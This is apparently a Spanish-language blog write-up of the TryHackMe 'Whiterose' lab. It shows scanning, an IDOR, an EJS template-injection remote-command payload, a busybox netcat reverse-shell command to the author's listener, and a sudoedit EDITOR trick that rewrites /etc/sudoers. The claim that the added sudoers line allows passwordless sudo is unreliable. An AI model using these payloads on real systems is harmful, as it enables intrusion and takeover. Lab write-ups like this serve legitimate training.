---
layout: ../../../../layouts/Post.astro
title: Whiterose THM Writeup
description: This is a writeup of Whiterose, a TryHackMe room.
publishDate: Martes, 25 de febrero de 2025
author: "s1lentMT"
image: "/assets/blog/whiterose/whiterose-thm.png"
alt: Image of TryHackMe's Whiterose room.
tags: ["Writeup"]
---

Se nos indica al principio que el usuario Olivia Cortez con la contraseña olivi8 serán útiles a lo largo de la máquina.

Tras un escaneo de nmap, podemos determinar que los puertos 80 y 22 están abiertos, teniendo así los servicios de SSH y Nginx activos.

```shell
nmap -sC -sV -O --osscan-guess 10.10.170.109

Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-22 19:32 GMT
Nmap scan report for cyprusbank.thm (10.10.170.109)
Host is up (0.00035s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
MAC Address: 02:12:8D:60:9B:2F (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), 
Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) 
(94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), 
Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ )
```

Las versiones de estos servicios son OpenSSH 7.6p1 Ubuntu 4ubuntu0.7, y nginx/1.14.0 respectivamente.

El sistema operativo de la máquina es Linux.

Al acceder a la web veremos un mensaje de mantenimiento.

![Imagen de la web](/assets/blog/whiterose/img-1.png)

## Enumeración

### Directorios

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://cyprusbank.thm/FUZZ -ic
```

Con esta búsqueda no se ha encontrado nada, por lo tanto paso a hacer enumeración de VHOSTS.

```shell
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ 
-u http://cyprusbank.thm -H 'Host: FUZZ.cyprusbank.thm' -ic -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 57
 :: Filter           : Response words: 1
 :: Filter           : Response lines: 4
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1]
WWW                     [Status: 200, Size: 252, Words: 19, Lines: 9]
:: Progress: [4997/4997] :: Job [1/1] :: 13044 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Como vemos, admin llama a la atención, por lo tanto editaremos el archivo /etc/hosts, para poder acceder.

Una vez accedemos, hay un panel de administración.

![Imagen del panel de administración](/assets/blog/whiterose/img-2.png)

Si probamos a usar las credenciales que nos han indicado anteriormente en la sala, obtendremos acceso al panel.

![Imagen de dentro del panel de administración](/assets/blog/whiterose/img-3.png)

Los datos que vemos en el panel están censurados, por lo que no podremos ver el número de teléfono de Tyrell.

Si accedemos a la sección de mensajes, veremos una url con un parámetro interesante. Si lo cambiamos, haremos un IDOR y obtendremos las credenciales de una cuenta de administrador.

Con esto ya podremos obtener el número de teléfono de Tyrell.

Si accedemos al apartado de settings, e interceptamos la request, podremos jugar con los parámetros y ver que podemos producir un error 500 que mostrará una traza interesante:

```log
ReferenceError: /home/web/app/views/settings.ejs:14
    12|         <div class="alert alert-info mb-3"><%= message %></div>
    13|       <% } %>
 >> 14|       <% if (password != -1) { %>
    15|         <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
    16|       <% } %>
    17|       <% if (typeof error != 'undefined') { %>

password is not defined
    at eval ("/home/web/app/views/settings.ejs":27:8)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at processTicksAndRejections (node:internal/process/task_queues:96:5)
```

Llama la atención el archivo settings.ejs, si buscamos algún tipo de exploit con referencia a esto, podremos vulnerar la máquina.

Y para nuestra suerte, hay un CVE que nos permite ejecutar comandos (RCE) en la máquina.

Con este payload podremos ejecutar el comando "whoami":

```http
name=test&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');&password=test
```

Al poder ejecutar este tipo de comandos, podríamos conseguir una reverse shell, lo que nos permitiría ejecutar comandos directamente en la máquina sin necesidad de interactuar a través de requests.

Con el siguiente payload podremos recibir la conexión en nuestro listener:

```shell
nc -lvnp 4444
name=test&password=&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.150.123 4444 -e sh');s
```

Posteriormente vamos a ver como en nuestro netcat se recibe una conexión, y podremos spawnear una shell con python o de otras maneras:

```shell
root@ip-10-10-150-123:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.0 38318
python3 -c 'import pty; pty.spawn("/bin/bash")'
web@cyprusbank:~/app$ 

web@cyprusbank:~/app$ id
id
uid=1001(web) gid=1001(web) groups=1001(web)

```

Si seguimos investigando dentro de los directorios de nuestro servidor, veremos la flag de user.txt:

```shell
web@cyprusbank:~/app$ cd ..
cd ..
web@cyprusbank:~$ ls
ls
app  user.txt
web@cyprusbank:~$ cat user.txt
cat user.txt
THM{XXXXXXXXXXXXX}
web@cyprusbank:~$ 
```

Para ver que comandos puede ejecutar nuestro usuario, haremos sudo -l y vemos que tenemos permisos para ejecutar sudoedit:

```shell
web@cyprusbank:~/app$ sudo -l     
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

A partir de aquí tenemos que ver como explotar la máquina y aprovecharnos de esto.

Vemos que hay un exploit que podemos hacer que nos permitiría tener privilegios como root:

```shell
export EDITOR="vim -- /etc/sudoers"
```

Esto nos permitirá abrir vim con el fichero /etc/sudoers cuando abramos el archivo /etc/nginx/sites-available/admin.cyprusbank.thm.

Ahora solo nos faltará hacer esto:

```shell
web ALL=(ALL:ALL) ALL
```

Y ya podríamos hacer sudo su sin contraseña necesaria :).

Solo nos faltaría encontrar el archivo root.txt, ver su contenido y ya tenemos nuestra sala terminada.

Esta flag se encontrará dnetro de /root, con un cat ya tendremos nuestra flag.
